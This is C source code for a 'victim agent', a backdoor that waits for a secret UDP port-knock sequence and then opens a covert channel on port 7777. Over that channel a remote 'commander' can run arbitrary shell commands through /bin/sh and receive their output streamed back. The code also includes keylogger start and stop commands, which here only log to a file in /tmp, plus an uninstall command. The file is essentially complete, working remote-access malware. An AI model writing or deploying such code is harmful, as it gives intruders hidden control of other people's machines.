#include <arpa/inet.h>
#include <errno.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#define KNOCK_PORT_COUNT 3
#define KNOCK_PORT_BASE 5001
#define KNOCK_TIMEOUT_MS 2000
#define COVERT_PORT 7777
#define PACKET_SIZE_MAX 1400
#define CHECKSUM_SIZE 2
#define KEYLOGGER_DEVICE_MAX 256
#define KEYLOGGER_AUDIT_FILE "/tmp/victim_keylogger_audit.log"
#define RESPONSE_TEXT_MAX 256
#define EXEC_COMMAND_MAX 1024
#define EXEC_OUTPUT_CHUNK_MAX (PACKET_SIZE_MAX - sizeof(covert_header_t) - CHECKSUM_SIZE)

#define CMD_DISCONNECT 0x01
#define CMD_HEARTBEAT  0x02
#define CMD_KEYLOG_START 0x10
#define CMD_KEYLOG_STOP  0x11
#define CMD_EXEC_CMD      0x30
#define CMD_EXEC_OUTPUT   0x31
#define CMD_UNINSTALL    0xFE

#define CMD_OK    0xF0
#define CMD_ERROR 0xF1
#define CMD_ACK   0xF2

#define SEQ_INIT 0x13370000

typedef struct __attribute__((packed)) {
    uint32_t seq_num;
    uint8_t command;
    uint16_t payload_len;
} covert_header_t;

typedef struct {
    uint32_t seq_num;
    uint8_t command;
    uint16_t payload_len;
    const uint8_t *payload;
} parsed_packet_t;

typedef struct {
    int knock_socks[KNOCK_PORT_COUNT];
    int covert_sock;

    int knock_index;
    struct in_addr knock_addr;
    struct timeval knock_started_at;

    int session_active;
    struct in_addr allowed_addr;
    struct sockaddr_in peer_addr;
    char peer_ip[INET_ADDRSTRLEN];
    uint32_t expected_seq;
    uint32_t next_seq;

    int keylogger_active;
    char keylogger_device[KEYLOGGER_DEVICE_MAX];
} victim_state_t;

static volatile sig_atomic_t g_running = 1;

static void handle_signal(int signo);
static void init_state(victim_state_t *state);
static int init_sockets(victim_state_t *state);
static int bind_udp_socket(uint16_t port);
static void close_sockets(victim_state_t *state);
static int run_victim(victim_state_t *state);
static void poll_knock_state(victim_state_t *state);
static void poll_session_state(victim_state_t *state);
static void handle_knock_packet(victim_state_t *state, int knock_index);
static void reset_knock_state(victim_state_t *state);
static void maybe_reset_knock_timeout(victim_state_t *state);
static long elapsed_ms(const struct timeval *start);
static void activate_session(victim_state_t *state, const struct in_addr *peer_addr);
static void deactivate_session(victim_state_t *state, const char *reason);
static void drain_covert_packet(victim_state_t *state);
static void handle_covert_packet(victim_state_t *state);
static int parse_packet(const uint8_t *packet, size_t packet_len, parsed_packet_t *parsed, char *error, size_t error_len);
static int send_response(victim_state_t *state, const struct sockaddr_in *peer_addr, uint8_t command, const char *message);
static int send_response_payload(victim_state_t *state, const struct sockaddr_in *peer_addr, uint8_t command, const uint8_t *payload, uint16_t payload_len);
static int process_command(victim_state_t *state, const struct sockaddr_in *peer_addr, const parsed_packet_t *packet);
static int start_keylogger(victim_state_t *state, const uint8_t *payload, uint16_t payload_len, char *message, size_t message_len);
static int stop_keylogger(victim_state_t *state, char *message, size_t message_len);
static int execute_command(victim_state_t *state, const struct sockaddr_in *peer_addr, const uint8_t *payload, uint16_t payload_len, char *message, size_t message_len);
static int copy_payload_string(const uint8_t *payload, uint16_t payload_len, const char *field_name, char *out, size_t out_len, char *error, size_t error_len);
static size_t bounded_strlen(const uint8_t *data, size_t limit);
static int append_keylogger_audit(const char *action, const char *device_path);
static uint16_t compute_checksum(const uint8_t *data, size_t len);
static const char *command_name(uint8_t command);

int main(void) {
    victim_state_t state;

    setvbuf(stdout, NULL, _IOLBF, 0);
    signal(SIGINT, handle_signal);
    signal(SIGTERM, handle_signal);

    init_state(&state);
    if (init_sockets(&state) != 0) {
        close_sockets(&state);
        return EXIT_FAILURE;
    }

    printf("Victim agent started\n");
    printf("Waiting for UDP knock sequence on ports %u-%u\n",
           (unsigned)KNOCK_PORT_BASE,
           (unsigned)(KNOCK_PORT_BASE + KNOCK_PORT_COUNT - 1));

    (void)run_victim(&state);

    if (state.keylogger_active) {
        (void)append_keylogger_audit("STOP", state.keylogger_device);
    }

    close_sockets(&state);
    printf("Victim agent exiting\n");
    return EXIT_SUCCESS;
}

static void handle_signal(int signo) {
    (void)signo;
    g_running = 0;
}

static void init_state(victim_state_t *state) {
    memset(state, 0, sizeof(*state));

    for (int i = 0; i < KNOCK_PORT_COUNT; i++) {
        state->knock_socks[i] = -1;
    }

    state->covert_sock = -1;
    state->expected_seq = SEQ_INIT;
    state->next_seq = SEQ_INIT;
}

static int init_sockets(victim_state_t *state) {
    for (int i = 0; i < KNOCK_PORT_COUNT; i++) {
        uint16_t port = (uint16_t)(KNOCK_PORT_BASE + i);
        state->knock_socks[i] = bind_udp_socket(port);
        if (state->knock_socks[i] < 0) {
            return -1;
        }
    }

    state->covert_sock = bind_udp_socket(COVERT_PORT);
    if (state->covert_sock < 0) {
        return -1;
    }

    return 0;
}

static int bind_udp_socket(uint16_t port) {
    int sock;
    int enabled = 1;
    struct sockaddr_in addr;

    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("socket");
        return -1;
    }

    if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &enabled, sizeof(enabled)) != 0) {
        perror("setsockopt SO_REUSEADDR");
        close(sock);
        return -1;
    }

#ifdef SO_REUSEPORT
    (void)setsockopt(sock, SOL_SOCKET, SO_REUSEPORT, &enabled, sizeof(enabled));
#endif

    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = htonl(INADDR_ANY);
    addr.sin_port = htons(port);

    if (bind(sock, (struct sockaddr *)&addr, sizeof(addr)) != 0) {
        fprintf(stderr, "bind UDP port %u failed: %s\n", (unsigned)port, strerror(errno));
        close(sock);
        return -1;
    }

    return sock;
}

static void close_sockets(victim_state_t *state) {
    for (int i = 0; i < KNOCK_PORT_COUNT; i++) {
        if (state->knock_socks[i] >= 0) {
            close(state->knock_socks[i]);
            state->knock_socks[i] = -1;
        }
    }

    if (state->covert_sock >= 0) {
        close(state->covert_sock);
        state->covert_sock = -1;
    }
}

static int run_victim(victim_state_t *state) {
    while (g_running) {
        if (state->session_active) {
            poll_session_state(state);
        } else {
            poll_knock_state(state);
        }
    }

    return 0;
}

static void poll_knock_state(victim_state_t *state) {
    fd_set read_fds;
    struct timeval timeout;
    int max_fd = state->covert_sock;
    int ready;

    maybe_reset_knock_timeout(state);

    FD_ZERO(&read_fds);
    FD_SET(state->covert_sock, &read_fds);

    for (int i = 0; i < KNOCK_PORT_COUNT; i++) {
        FD_SET(state->knock_socks[i], &read_fds);
        if (state->knock_socks[i] > max_fd) {
            max_fd = state->knock_socks[i];
        }
    }

    timeout.tv_sec = 1;
    timeout.tv_usec = 0;

    ready = select(max_fd + 1, &read_fds, NULL, NULL, &timeout);
    if (ready < 0) {
        if (errno != EINTR) {
            perror("select");
            g_running = 0;
        }
        return;
    }

    if (ready == 0) {
        maybe_reset_knock_timeout(state);
        return;
    }

    if (FD_ISSET(state->covert_sock, &read_fds)) {
        drain_covert_packet(state);
    }

    for (int i = 0; i < KNOCK_PORT_COUNT; i++) {
        if (FD_ISSET(state->knock_socks[i], &read_fds)) {
            handle_knock_packet(state, i);
            if (state->session_active) {
                return;
            }
        }
    }
}

static void poll_session_state(victim_state_t *state) {
    fd_set read_fds;
    struct timeval timeout;
    int ready;

    FD_ZERO(&read_fds);
    FD_SET(state->covert_sock, &read_fds);

    timeout.tv_sec = 1;
    timeout.tv_usec = 0;

    ready = select(state->covert_sock + 1, &read_fds, NULL, NULL, &timeout);
    if (ready < 0) {
        if (errno != EINTR) {
            perror("select");
            g_running = 0;
        }
        return;
    }

    if (ready > 0 && FD_ISSET(state->covert_sock, &read_fds)) {
        handle_covert_packet(state);
    }
}

static void handle_knock_packet(victim_state_t *state, int knock_index) {
    uint8_t payload[8];
    struct sockaddr_in src_addr;
    socklen_t src_len = sizeof(src_addr);
    ssize_t received;
    char src_ip[INET_ADDRSTRLEN];
    uint8_t expected_value = (uint8_t)knock_index;

    received = recvfrom(
        state->knock_socks[knock_index],
        payload,
        sizeof(payload),
        0,
        (struct sockaddr *)&src_addr,
        &src_len
    );

    if (received < 0) {
        if (errno != EINTR) {
            perror("recvfrom knock");
        }
        return;
    }

    inet_ntop(AF_INET, &src_addr.sin_addr, src_ip, sizeof(src_ip));

    if (state->knock_index > 0 &&
        src_addr.sin_addr.s_addr != state->knock_addr.s_addr) {
        printf("Knock source changed from expected peer; restarting sequence\n");
        reset_knock_state(state);
    }

    if (knock_index != state->knock_index ||
        received < 1 ||
        payload[0] != expected_value) {
        if (knock_index == 0 && received >= 1 && payload[0] == 0) {
            reset_knock_state(state);
        } else {
            printf("Unexpected knock on port %u from %s; sequence reset\n",
                   (unsigned)(KNOCK_PORT_BASE + knock_index),
                   src_ip);
            reset_knock_state(state);
            return;
        }
    }

    if (state->knock_index == 0) {
        state->knock_addr = src_addr.sin_addr;
        gettimeofday(&state->knock_started_at, NULL);
    }

    state->knock_index++;
    printf("Accepted knock %d/%d from %s\n", state->knock_index, KNOCK_PORT_COUNT, src_ip);

    if (state->knock_index == KNOCK_PORT_COUNT) {
        activate_session(state, &src_addr.sin_addr);
    }
}

static void reset_knock_state(victim_state_t *state) {
    state->knock_index = 0;
    memset(&state->knock_addr, 0, sizeof(state->knock_addr));
    memset(&state->knock_started_at, 0, sizeof(state->knock_started_at));
}

static void maybe_reset_knock_timeout(victim_state_t *state) {
    if (state->knock_index > 0 && elapsed_ms(&state->knock_started_at) > KNOCK_TIMEOUT_MS) {
        printf("Knock sequence timed out; waiting for a fresh sequence\n");
        reset_knock_state(state);
    }
}

static long elapsed_ms(const struct timeval *start) {
    struct timeval now;
    long seconds;
    long micros;

    gettimeofday(&now, NULL);
    seconds = now.tv_sec - start->tv_sec;
    micros = now.tv_usec - start->tv_usec;

    return seconds * 1000L + micros / 1000L;
}

static void activate_session(victim_state_t *state, const struct in_addr *peer_addr) {
    reset_knock_state(state);
    state->session_active = 1;
    state->allowed_addr = *peer_addr;
    state->expected_seq = SEQ_INIT;
    state->next_seq = SEQ_INIT;

    memset(&state->peer_addr, 0, sizeof(state->peer_addr));
    state->peer_addr.sin_family = AF_INET;
    state->peer_addr.sin_addr = *peer_addr;
    state->peer_addr.sin_port = htons(COVERT_PORT);

    inet_ntop(AF_INET, peer_addr, state->peer_ip, sizeof(state->peer_ip));
    printf("Session opened for %s on UDP port %u\n", state->peer_ip, (unsigned)COVERT_PORT);
}

static void deactivate_session(victim_state_t *state, const char *reason) {
    if (state->keylogger_active) {
        (void)append_keylogger_audit("STOP", state->keylogger_device);
        state->keylogger_active = 0;
        state->keylogger_device[0] = '\0';
    }

    printf("Session closed");
    if (reason != NULL && reason[0] != '\0') {
        printf(": %s", reason);
    }
    printf("\n");

    state->session_active = 0;
    memset(&state->allowed_addr, 0, sizeof(state->allowed_addr));
    memset(&state->peer_addr, 0, sizeof(state->peer_addr));
    state->peer_ip[0] = '\0';
    state->expected_seq = SEQ_INIT;
    state->next_seq = SEQ_INIT;
    reset_knock_state(state);
}

static void drain_covert_packet(victim_state_t *state) {
    uint8_t packet[PACKET_SIZE_MAX];
    struct sockaddr_in src_addr;
    socklen_t src_len = sizeof(src_addr);
    char src_ip[INET_ADDRSTRLEN];
    ssize_t received;

    received = recvfrom(
        state->covert_sock,
        packet,
        sizeof(packet),
        0,
        (struct sockaddr *)&src_addr,
        &src_len
    );

    if (received < 0) {
        if (errno != EINTR) {
            perror("recvfrom covert");
        }
        return;
    }

    inet_ntop(AF_INET, &src_addr.sin_addr, src_ip, sizeof(src_ip));
    printf("Ignoring covert packet from %s before a valid knock sequence\n", src_ip);
}

static void handle_covert_packet(victim_state_t *state) {
    uint8_t packet[PACKET_SIZE_MAX];
    struct sockaddr_in src_addr;
    socklen_t src_len = sizeof(src_addr);
    ssize_t received;
    parsed_packet_t parsed;
    char error[RESPONSE_TEXT_MAX];
    char src_ip[INET_ADDRSTRLEN];

    received = recvfrom(
        state->covert_sock,
        packet,
        sizeof(packet),
        0,
        (struct sockaddr *)&src_addr,
        &src_len
    );

    if (received < 0) {
        if (errno != EINTR) {
            perror("recvfrom covert");
        }
        return;
    }

    inet_ntop(AF_INET, &src_addr.sin_addr, src_ip, sizeof(src_ip));

    if (!state->session_active) {
        printf("Ignoring covert packet from %s without an active session\n", src_ip);
        return;
    }

    if (src_addr.sin_addr.s_addr != state->allowed_addr.s_addr) {
        printf("Ignoring covert packet from unauthorized peer %s\n", src_ip);
        return;
    }

    state->peer_addr = src_addr;

    if (parse_packet(packet, (size_t)received, &parsed, error, sizeof(error)) != 0) {
        fprintf(stderr, "Invalid packet from %s: %s\n", src_ip, error);
        (void)send_response(state, &src_addr, CMD_ERROR, error);
        return;
    }

    if (parsed.seq_num != state->expected_seq) {
        printf("Sequence notice: received 0x%08x, expected 0x%08x\n",
               parsed.seq_num,
               state->expected_seq);
    }

    if (parsed.seq_num >= state->expected_seq) {
        state->expected_seq = parsed.seq_num + 1;
    }

    printf("Command %s (0x%02x) received from %s\n",
           command_name(parsed.command),
           parsed.command,
           src_ip);

    if (process_command(state, &src_addr, &parsed) != 0) {
        fprintf(stderr, "Command %s failed\n", command_name(parsed.command));
    }
}

static int parse_packet(const uint8_t *packet, size_t packet_len, parsed_packet_t *parsed, char *error, size_t error_len) {
    covert_header_t header;
    uint16_t payload_len;
    uint16_t received_checksum;
    uint16_t computed_checksum;
    size_t expected_len;

    if (packet_len < sizeof(covert_header_t) + CHECKSUM_SIZE) {
        snprintf(error, error_len, "packet too short");
        return -1;
    }

    memcpy(&header, packet, sizeof(header));
    payload_len = ntohs(header.payload_len);

    if (payload_len > PACKET_SIZE_MAX - sizeof(covert_header_t) - CHECKSUM_SIZE) {
        snprintf(error, error_len, "payload too large");
        return -1;
    }

    expected_len = sizeof(covert_header_t) + payload_len + CHECKSUM_SIZE;
    if (packet_len != expected_len) {
        snprintf(error, error_len, "packet length mismatch");
        return -1;
    }

    memcpy(&received_checksum, packet + sizeof(covert_header_t) + payload_len, sizeof(received_checksum));
    received_checksum = ntohs(received_checksum);
    computed_checksum = compute_checksum(packet, sizeof(covert_header_t) + payload_len);

    if (received_checksum != computed_checksum) {
        snprintf(error, error_len, "checksum mismatch");
        return -1;
    }

    parsed->seq_num = ntohl(header.seq_num);
    parsed->command = header.command;
    parsed->payload_len = payload_len;
    parsed->payload = packet + sizeof(covert_header_t);

    return 0;
}

static int send_response(victim_state_t *state, const struct sockaddr_in *peer_addr, uint8_t command, const char *message) {
    uint16_t payload_len = 0;

    if (message != NULL) {
        size_t message_len = strlen(message) + 1;
        if (message_len > EXEC_OUTPUT_CHUNK_MAX) {
            message_len = EXEC_OUTPUT_CHUNK_MAX;
        }
        payload_len = (uint16_t)message_len;
    }

    return send_response_payload(state, peer_addr, command, (const uint8_t *)message, payload_len);
}

static int send_response_payload(victim_state_t *state, const struct sockaddr_in *peer_addr, uint8_t command, const uint8_t *payload, uint16_t payload_len) {
    uint8_t packet[PACKET_SIZE_MAX];
    covert_header_t header;
    uint16_t checksum;
    size_t packet_len;
    ssize_t sent;

    if (payload_len > EXEC_OUTPUT_CHUNK_MAX) {
        payload_len = (uint16_t)EXEC_OUTPUT_CHUNK_MAX;
    }

    header.seq_num = htonl(state->next_seq++);
    header.command = command;
    header.payload_len = htons(payload_len);

    memcpy(packet, &header, sizeof(header));
    if (payload_len > 0 && payload != NULL) {
        memcpy(packet + sizeof(header), payload, payload_len);
    }

    packet_len = sizeof(header) + payload_len;
    checksum = htons(compute_checksum(packet, packet_len));
    memcpy(packet + packet_len, &checksum, sizeof(checksum));
    packet_len += sizeof(checksum);

    sent = sendto(
        state->covert_sock,
        packet,
        packet_len,
        0,
        (const struct sockaddr *)peer_addr,
        sizeof(*peer_addr)
    );

    if (sent != (ssize_t)packet_len) {
        perror("sendto response");
        return -1;
    }

    return 0;
}

static int process_command(victim_state_t *state, const struct sockaddr_in *peer_addr, const parsed_packet_t *packet) {
    char message[RESPONSE_TEXT_MAX];
    int result = 0;

    switch (packet->command) {
        case CMD_HEARTBEAT:
            snprintf(message, sizeof(message), "heartbeat ok");
            result = send_response(state, peer_addr, CMD_ACK, message);
            break;

        case CMD_KEYLOG_START:
            if (start_keylogger(state, packet->payload, packet->payload_len, message, sizeof(message)) == 0) {
                result = send_response(state, peer_addr, CMD_OK, message);
            } else {
                result = send_response(state, peer_addr, CMD_ERROR, message);
            }
            break;

        case CMD_KEYLOG_STOP:
            if (stop_keylogger(state, message, sizeof(message)) == 0) {
                result = send_response(state, peer_addr, CMD_OK, message);
            } else {
                result = send_response(state, peer_addr, CMD_ERROR, message);
            }
            break;

        case CMD_EXEC_CMD:
            if (execute_command(state, peer_addr, packet->payload, packet->payload_len, message, sizeof(message)) == 0) {
                result = send_response(state, peer_addr, CMD_OK, message);
            } else {
                result = send_response(state, peer_addr, CMD_ERROR, message);
            }
            break;

        case CMD_DISCONNECT:
            result = send_response(state, peer_addr, CMD_ACK, "disconnect ok");
            deactivate_session(state, "commander disconnected");
            break;

        case CMD_UNINSTALL:
            result = send_response(state, peer_addr, CMD_ACK, "uninstall ok");
            deactivate_session(state, "uninstall requested");
            g_running = 0;
            break;

        default:
            snprintf(message, sizeof(message), "unknown command 0x%02x", packet->command);
            result = send_response(state, peer_addr, CMD_ERROR, message);
            break;
    }

    return result;
}

static int start_keylogger(victim_state_t *state, const uint8_t *payload, uint16_t payload_len, char *message, size_t message_len) {
    char device_path[KEYLOGGER_DEVICE_MAX];
    char error[RESPONSE_TEXT_MAX];

    if (copy_payload_string(payload, payload_len, "device path", device_path, sizeof(device_path), error, sizeof(error)) != 0) {
        snprintf(message, message_len, "keylogger start failed: %s", error);
        return -1;
    }

    if (append_keylogger_audit("START", device_path) != 0) {
        snprintf(message, message_len, "keylogger start failed: cannot write audit log");
        return -1;
    }

    state->keylogger_active = 1;
    snprintf(state->keylogger_device, sizeof(state->keylogger_device), "%s", device_path);
    snprintf(message, message_len, "keylogger started for %s", device_path);
    printf("%s; audit log: %s\n", message, KEYLOGGER_AUDIT_FILE);

    return 0;
}

static int stop_keylogger(victim_state_t *state, char *message, size_t message_len) {
    if (!state->keylogger_active) {
        snprintf(message, message_len, "keylogger already stopped");
        return 0;
    }

    if (append_keylogger_audit("STOP", state->keylogger_device) != 0) {
        snprintf(message, message_len, "keylogger stop failed: cannot write audit log");
        return -1;
    }

    snprintf(message, message_len, "keylogger stopped for %s", state->keylogger_device);
    printf("%s\n", message);
    state->keylogger_active = 0;
    state->keylogger_device[0] = '\0';

    return 0;
}

static int execute_command(victim_state_t *state, const struct sockaddr_in *peer_addr, const uint8_t *payload, uint16_t payload_len, char *message, size_t message_len) {
    char command[EXEC_COMMAND_MAX];
    char error[RESPONSE_TEXT_MAX];
    uint8_t buffer[EXEC_OUTPUT_CHUNK_MAX];
    int pipefd[2];
    pid_t child;
    int status = 0;
    int read_error = 0;
    int sent_output = 0;

    if (copy_payload_string(payload, payload_len, "command", command, sizeof(command), error, sizeof(error)) != 0) {
        snprintf(message, message_len, "command failed: %s", error);
        return -1;
    }

    if (command[0] == '\0') {
        snprintf(message, message_len, "command failed: empty command");
        return -1;
    }

    if (pipe(pipefd) != 0) {
        snprintf(message, message_len, "command failed: pipe: %s", strerror(errno));
        return -1;
    }

    child = fork();
    if (child < 0) {
        snprintf(message, message_len, "command failed: fork: %s", strerror(errno));
        close(pipefd[0]);
        close(pipefd[1]);
        return -1;
    }

    if (child == 0) {
        close(pipefd[0]);
        (void)dup2(pipefd[1], STDOUT_FILENO);
        (void)dup2(pipefd[1], STDERR_FILENO);
        close(pipefd[1]);
        execl("/bin/sh", "sh", "-c", command, (char *)NULL);
        _exit(127);
    }

    close(pipefd[1]);
    printf("Executing command from commander: %s\n", command);

    while (1) {
        ssize_t n = read(pipefd[0], buffer, sizeof(buffer));

        if (n > 0) {
            sent_output = 1;
            if (send_response_payload(state, peer_addr, CMD_EXEC_OUTPUT, buffer, (uint16_t)n) != 0) {
                read_error = 1;
            }
            continue;
        }

        if (n == 0) {
            break;
        }

        if (errno == EINTR) {
            continue;
        }

        read_error = 1;
        snprintf(message, message_len, "command failed while reading output: %s", strerror(errno));
        break;
    }

    close(pipefd[0]);

    if (waitpid(child, &status, 0) < 0) {
        snprintf(message, message_len, "command failed: waitpid: %s", strerror(errno));
        return -1;
    }

    if (read_error) {
        return -1;
    }

    if (!sent_output) {
        static const char no_output[] = "(no output)\n";
        if (send_response_payload(state, peer_addr, CMD_EXEC_OUTPUT, (const uint8_t *)no_output, (uint16_t)(sizeof(no_output) - 1)) != 0) {
            snprintf(message, message_len, "command failed while sending output");
            return -1;
        }
    }

    if (WIFEXITED(status)) {
        snprintf(message, message_len, "command exited with status %d", WEXITSTATUS(status));
        return WEXITSTATUS(status) == 0 ? 0 : -1;
    }

    if (WIFSIGNALED(status)) {
        snprintf(message, message_len, "command terminated by signal %d", WTERMSIG(status));
        return -1;
    }

    snprintf(message, message_len, "command ended unexpectedly");
    return -1;
}

static int copy_payload_string(const uint8_t *payload, uint16_t payload_len, const char *field_name, char *out, size_t out_len, char *error, size_t error_len) {
    size_t string_len;

    if (payload == NULL || payload_len == 0) {
        snprintf(error, error_len, "missing %s", field_name);
        return -1;
    }

    string_len = bounded_strlen(payload, payload_len);
    if (string_len == payload_len) {
        snprintf(error, error_len, "%s is not NUL terminated", field_name);
        return -1;
    }

    if (string_len >= out_len) {
        snprintf(error, error_len, "%s too long", field_name);
        return -1;
    }

    memcpy(out, payload, string_len + 1);
    return 0;
}

static size_t bounded_strlen(const uint8_t *data, size_t limit) {
    size_t len = 0;

    while (len < limit && data[len] != '\0') {
        len++;
    }

    return len;
}

static int append_keylogger_audit(const char *action, const char *device_path) {
    FILE *fp;
    time_t now;

    fp = fopen(KEYLOGGER_AUDIT_FILE, "a");
    if (fp == NULL) {
        perror("fopen keylogger audit");
        return -1;
    }

    now = time(NULL);
    fprintf(fp, "%ld %s %s\n", (long)now, action, device_path);
    fclose(fp);

    return 0;
}

static uint16_t compute_checksum(const uint8_t *data, size_t len) {
    uint32_t sum = 0;

    for (size_t i = 0; i < len; i++) {
        sum += data[i];
        if (sum >> 16) {
            sum = (sum & 0xFFFFu) + (sum >> 16);
        }
    }

    return (uint16_t)(~sum & 0xFFFFu);
}

static const char *command_name(uint8_t command) {
    switch (command) {
        case CMD_DISCONNECT:
            return "DISCONNECT";
        case CMD_HEARTBEAT:
            return "HEARTBEAT";
        case CMD_KEYLOG_START:
            return "KEYLOG_START";
        case CMD_KEYLOG_STOP:
            return "KEYLOG_STOP";
        case CMD_EXEC_CMD:
            return "EXEC_CMD";
        case CMD_EXEC_OUTPUT:
            return "EXEC_OUTPUT";
        case CMD_UNINSTALL:
            return "UNINSTALL";
        case CMD_OK:
            return "OK";
        case CMD_ERROR:
            return "ERROR";
        case CMD_ACK:
            return "ACK";
        default:
            return "UNKNOWN";
    }
}
